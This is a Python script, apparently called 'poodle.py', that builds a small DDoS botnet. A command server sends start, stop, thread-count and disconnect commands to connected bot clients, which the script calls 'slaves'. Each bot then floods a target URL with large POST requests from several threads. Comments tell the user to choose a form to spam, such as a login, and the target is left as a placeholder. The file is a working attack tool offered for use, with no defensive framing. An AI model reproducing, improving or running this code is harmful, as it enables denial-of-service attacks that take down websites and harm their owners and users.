import threading
import requests
import random
import string
import time
import asyncio
import json
import subprocess
import os
import sys
from time import sleep

#########################################
#                                       #
#                Server                 #
#                                       #
#########################################

class Server:
    def __init__(self) -> None:
        file = open('config.json')
        config = json.load(file)
        self.HOST = config['host']
        self.PORT = config['port']
        self.PEER_LIST = {}

    async def listen_and_accept(self, reader: asyncio.StreamReader, writer: asyncio.StreamWriter) -> None:
        addr, port = writer.get_extra_info("peername")
        self.PEER_LIST[str(addr)+':'+str(port)] = (reader, writer)

    async def run_server(self) -> None:
        server = await asyncio.start_server(self.listen_and_accept, self.HOST, self.PORT)

        async with server:
            await server.serve_forever()

    async def send_command(self):
        PEER_LIST2 = {}

        while True:
            command = self.c_in(input("[+]: "))
            PEER_LIST2 = self.PEER_LIST.copy()
            for el in PEER_LIST2:

                try:
                    _, writer = PEER_LIST2[el]
                    _, port = writer.get_extra_info("peername")
                    if writer.is_closing():
                        raise Exception("Socket closed")
                    writer.write(command.encode())
                    await writer.drain()

                except Exception as e:
                    try:
                        return_query = subprocess.run(["fuser", "-k", str(port) + "/tcp"])
                        self.PEER_LIST.pop(el)

                    except Exception as e:
                        print(e)
                        continue

    def c_in(self, command: str) -> None :
        print('')

        if(command.strip() == "/start"):
            command = '/* start */'
            return command

        elif(command.strip() == "/stop"):
            command = '/* stop */'
            return command

        elif(command.strip() == '/disconnect'):
            command = '/* exit */'
            return command

        elif(command.strip() == '/threads'):
            thread_number = int(input('Enter thread number: '))
            print('')

            command = f'{thread_number}<'
            return command

        elif(command.strip() == '/list'):
            number_of_connections = 0

            for el in self.PEER_LIST:
                number_of_connections += 1
                reader, writer = self.PEER_LIST[el]
                addr, port = writer.get_extra_info("peername")
                print(f'Address: {addr}, Port: {port}')

            print(f'Number of connections <[{number_of_connections}]>')
            print('')

            return self.c_in(input("[+]: "))

        elif(command.strip() == '/help'):

            print('/help            ---> prints all the comamnds')
            print('')
            print('/start           ---> starts the attack')
            print('/stop            ---> stops the attack')
            print('/threads         ---> sets the number of slaves')
            print('/disconnect      ---> disconnects all the slaves')
            print('/list            ---> lists all the connections')
            print('/clear           ---> clear all text from terminal')
            print('/exit            ---> closes the main program')
            print('')

            return self.c_in(input("[+]: "))

        elif(command.strip() == '/clear'):
            os.system('clear')

            return self.c_in(input("[+]: "))

        elif(command.strip() == '/exit'):
            os._exit(1)

        else:
            print('Unknown command...')
            print('Type another one.')
            print('')

            return self.c_in(input("[+]: "))

    def server_start(self):
        print("Command prompt started . . .")
        _thread = threading.Thread(target=asyncio.run, args=(server.send_command(),))
        _thread.start()
        loop = asyncio.new_event_loop()
        loop.run_until_complete(self.run_server())

#########################################
#                                       #
#                Client                 #
#                                       #
#########################################

class Client:
    
    def __init__(self) -> None:
        file = open('config.json')
        config = json.load(file)
        self.HOST = config['host']
        self.PORT = config['port']
        self.number_of_threads = 5
        self.stresser = Stresser(self.number_of_threads)
        self.connected = False

    async def run_client(self) -> None:
        try:
            reader, writer = await asyncio.open_connection(self.HOST, self.PORT)
            await writer.drain()
            self.connected = True
        except:
            self.connected = False
            while self.connected == False:
                try:
                    reader, writer = await asyncio.open_connection(self.HOST, self.PORT)
                    await writer.drain()
                    self.connected = True
                except:
                    pass

        while True:
            try:
                data = await reader.read(1024)

                if not data:
                    raise Exception("socket closed")

                print(f"Recieved: {data.decode()}")

                if data.decode() == '/* start */':

                    self.stresser.stop = False
                    self.start()

                elif data.decode() == '/* stop */':
                    self.stresser.stop = True
                    print('Stopping the threads . . .')

                elif data.decode() == '/* exit */':
                    os._exit(1)

                elif data.decode()[len(data.decode()) - 1] == '<':
                    self.number_of_threads = int(data.decode()[0: len(data.decode()) - 1])


            except:
                await self.run_client()

    def start(self) -> None:
        for i in range(self.number_of_threads):
            _thread = threading.Thread(target= self.stresser.attack)
            _thread.start()

    def start_client(self) -> None:
        print('- - - w a i t i n g - - -')
        loop = asyncio.new_event_loop()
        loop.run_until_complete(self.run_client())

#########################################
#                                       #
#                Stresser               #
#                                       #
#########################################

class Stresser:

    def __init__(self, number_of_threads: int) -> None:
        self.number_of_threads = number_of_threads
        self.data = str(random.choices(string.ascii_lowercase, k=99_999))
        self.post_url = "http://www.example.com"
        
        # find the right POST request that you want to spam
        # example: f'"LOGUSER={self.data}&LOGPASS={self.data}'
        # self.data is important because its a package of 100000 chars
        # that is being sent in a request
        
        self.package = f'POST request here'
        self.stop = False

    def attack(self) -> None:
        self.get_some_sleep()
        while True:
            if self.stop != True:
                try:
                    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
                    r = requests.post(self.post_url, data= self.package, headers=headers)
                except:
                    self.attack()
            else:
                break

    def get_threads(self) -> int:
        return self.number_of_threads

    def get_some_sleep(self) -> None:
        delay_time = random.uniform(0, 1)
        time.sleep(delay_time)

if __name__=="__main__":
    try:
        flags = sys.argv

        if flags[1] == '--server':
            server = Server()
            server.server_start()
        elif flags[1] == '--bot':
            client = Client()
            client.start_client()
        elif flags[1] == '--help':
            print('Example: ')
            print('To run server: ./poodle.py --server or python3 poodle.py --server ')
            print('To run client: ./poodle.py --slave or python3 poodle.py --slave ')

    except:
        print('--run the script with --help flag ')
        pass
